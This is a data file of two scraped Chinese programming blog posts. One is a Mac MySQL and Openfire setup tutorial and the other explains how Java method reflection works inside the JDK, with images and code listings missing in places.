{"timestamp": "2018_08_14_11_13_12", "desc": "-下载安装配置MySql Sever\n\n1、安装\n\n\n  由于实在本台电脑上配置openfire环境，所以需要mysql数据库，mac上mysql有很多版本,我用的这版 \n  \n\n\n双击x86.pkg,安装。此时在mac应用程序里找不到mySql，因为并不是装的应用程序，再双击.prefPane文件，去mac系统偏好设置，会看到这个图标，就算装成功了 \n\n\n再点击start MySql Server，使状态为running，如图\n\n\n\n如果要系统启动就运行mysql，需要继续双击安装第三个文件，mySqlStartupItem。\n\n2、使用终端管理mysql\n\n配置 \n打开终端：输入\n\n\n  sudo vi ~/.bash_profile\n\n\ni进入编辑模式，插入\n\n\n  # mysql \n  alias mysql=’/usr/local/mysql/bin/mysql’ \n  alias mysqladmin=’/usr/local/mysql/bin/mysqladmin’ \n   # ls \n  alias ls=’ls -G’\n\n\n保存退出\n\n\n  :wq\n\n\n平时我们在手机端使用sqlite并没有密码，用户名，但是mysql不同，使用mysql数据库有密码和用户名，默认用户名：root，密码为空。 \n打开终端，演示操作本机上装好的mysql，输入命令\n\n\n  mysql -u root -p\n\n\n提示输入密码，由于密码为空，直接回车。此时继续输入命令\n\n\n  show databases; (不要忘记符号)\n\n\n可以看到数据库存在的几个表，用命令行管理Mysql就到此为止\n\n\n\n退出命令用\n\n\n  exit;\n\n\n下面介绍修改mysql密码\n\n\n\n这个时候默认密码是空，可以直接用\n\n\n  mysqladmin -u root password “123456”\n\n\n修改,现在密码是123456了，如果这个时候我还要改为1，就要把这个密码加上了，想想要是不用密码就可以改密码，那岂不是人人都能改了。 \n\n\n安装java运行环境 \n \n安装openfir\n\n这里主要说的是安装openfire我遇到的问题，mac os10.10 openfire 无法启动，或者说打不开localhost：9090；解决方法是下载最新版的openfire和jdk。如果还是不行，打开终端，输入\n\n\n\n3、用mysqlWorkBench管理\n\n直接下载安装mysqlWorkBench\n\n1、添加连接 \n\n\nmac前往/usr/local ，打开openfire的database，拿出\n\n\n\n导入到workBench中", "time": "2018_08_14_11_13_12", "link": "https://blog.csdn.net/qq_23614723/article/details/50146037", "title": "mac配置openfire具体步骤及遇到的问题总结"}
{"timestamp": "2018_08_14_11_13_12", "desc": "博主说：Java 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。在本文中，占小狼分析了 Java 反射机制的实现原理（源码），大家可以一起与博主花上几分钟研究一下。\n\n\n正文\n\n\n\n方法反射实例\n\n\n\npublic class ReflectCase {\n\n    public static void main(String[] args) throws Exception {\n        Proxy target = new Proxy();\n        Method method = Proxy.class.getDeclaredMethod(\"run\");\n        method.invoke(target);\n    }\n\n    static class Proxy {\n        public void run() {\n            System.out.println(\"run\");\n        }\n    }\n}\n\n通过 Java 的反射机制，可以在运行期间调用对象的任何方法，如果大量使用这种方式进行调用，会有性能或内存隐患么？为了彻底了解方法的反射机制，只能从底层代码入手啦！\n\nMethod 获取\n\n调用 Class 类的getDeclaredMethod可以获取指定方法名和参数的方法对象 Method。\n\n\n\ngetDeclaredMethod\n\n\n\n其中privateGetDeclaredMethods方法从缓存或 JVM 中获取该 Class 中申明的方法列表，searchMethods方法将从返回的方法列表里找到一个匹配名称和参数的方法对象。\n\n\n\nsearchMethods\n\n\n\n如果找到一个匹配的 Method，则重新复制一份返回，即Method.copy()方法。\n\n\n\n所次每次调用getDeclaredMethod方法返回的 Method 对象其实都是一个新的对象，且新对象的root属性都指向原来的 Method 对象，如果需要频繁调用，最好把 Method 对象缓存起来。\n\n\n\nprivateGetDeclaredMethods\n\n从缓存或 JVM 中获取该 Class 中申明的方法列表，实现如下：\n\n\n\n其中reflectionData()方法实现如下：\n\n\n\n这里有个比较重要的数据结构ReflectionData，用来缓存从 JVM 中读取类的如下属性数据：\n\n\n\n从reflectionData()方法实现可以看出：reflectionData对象是SoftReference类型的，说明在内存紧张时可能会被回收，不过也可以通过-XX:SoftRefLRUPolicyMSPerMB参数控制回收的时机，只要发生GC就会将其回收，如果reflectionData被回收之后，又执行了反射方法，那只能通过newReflectionData方法重新创建一个这样的对象了，newReflectionData方法实现如下：\n\n\n\n通过unsafe.compareAndSwapObject方法重新设置reflectionData字段；在privateGetDeclaredMethods方法中，如果通过reflectionData()获得的ReflectionData对象不为空，则尝试从ReflectionData对象中获取declaredMethods属性，如果是第一次，或则被GC回收之后，重新初始化后的类属性为空，则需要重新到 JVM 中获取一次，并赋值给ReflectionData，下次调用就可以使用缓存数据了。\n\n\n\nMethod 调用\n\n获取到指定的方法对象 Method 之后，就可以调用它的invoke方法了，invoke实现如下：\n\n\n\n应该注意到：这里的MethodAccessor对象是invoke方法实现的关键，一开始methodAccessor为空，需要调用acquireMethodAccessor生成一个新的MethodAccessor对象，MethodAccessor本身就是一个接口，实现如下：\n\n\n\n在acquireMethodAccessor方法中，会通过ReflectionFactory类的newMethodAccessor创建一个实现了MethodAccessor接口的对象，实现如下：\n\n\n\n在ReflectionFactory类中，有 2 个重要的字段：noInflation（默认false）和inflationThreshold（默认15），在checkInitted方法中可以通过-Dsun.reflect.inflationThreshold=xxx和-Dsun.reflect.noInflation=true对这两个字段重新设置，而且只会设置一次；如果noInflation为false，方法newMethodAccessor都会返回DelegatingMethodAccessorImpl对象，DelegatingMethodAccessorImpl的类实现：\n\n\n\n其实，DelegatingMethodAccessorImpl对象就是一个代理对象，负责调用被代理对象delegate的invoke方法，其中delegate参数目前是NativeMethodAccessorImpl对象，所以最终 Method 的invoke方法调用的是NativeMethodAccessorImpl对象invoke方法，实现如下：\n\n\n\n这里用到了ReflectionFactory类中的inflationThreshold，当delegate调用了15次invoke方法之后，如果继续调用就通过MethodAccessorGenerator类的generateMethod方法生成MethodAccessorImpl对象，并设置为delegate对象，这样下次执行Method.invoke时，就调用新建的MethodAccessor对象的invoke()方法了。这里需要注意的是：generateMethod方法在生成MethodAccessorImpl对象时，会在内存中生成对应的字节码，并调用ClassDefiner.defineClass创建对应的 Class 对象，实现如下：\n\n\n\n在ClassDefiner.defineClass方法实现中，每被调用一次都会生成一个DelegatingClassLoader类加载器对象：\n\n\n\n这里每次都生成新的类加载器，是为了性能考虑，在某些情况下可以卸载这些生成的类，因为类的卸载是只有在类加载器可以被回收的情况下才会被回收的，如果用了原来的类加载器，那可能导致这些新创建的类一直无法被卸载，从其设计来看本身就不希望这些类一直存在内存里的，在需要的时候有就行啦！\n\n\n\n转载声明：本文转自简书「占小狼」，深入分析Java方法反射的实现原理。", "time": "2018_08_14_11_13_12", "link": "https://blog.csdn.net/ff906317011/article/details/78551356", "title": "深入分析Java方法反射的实现原理"}
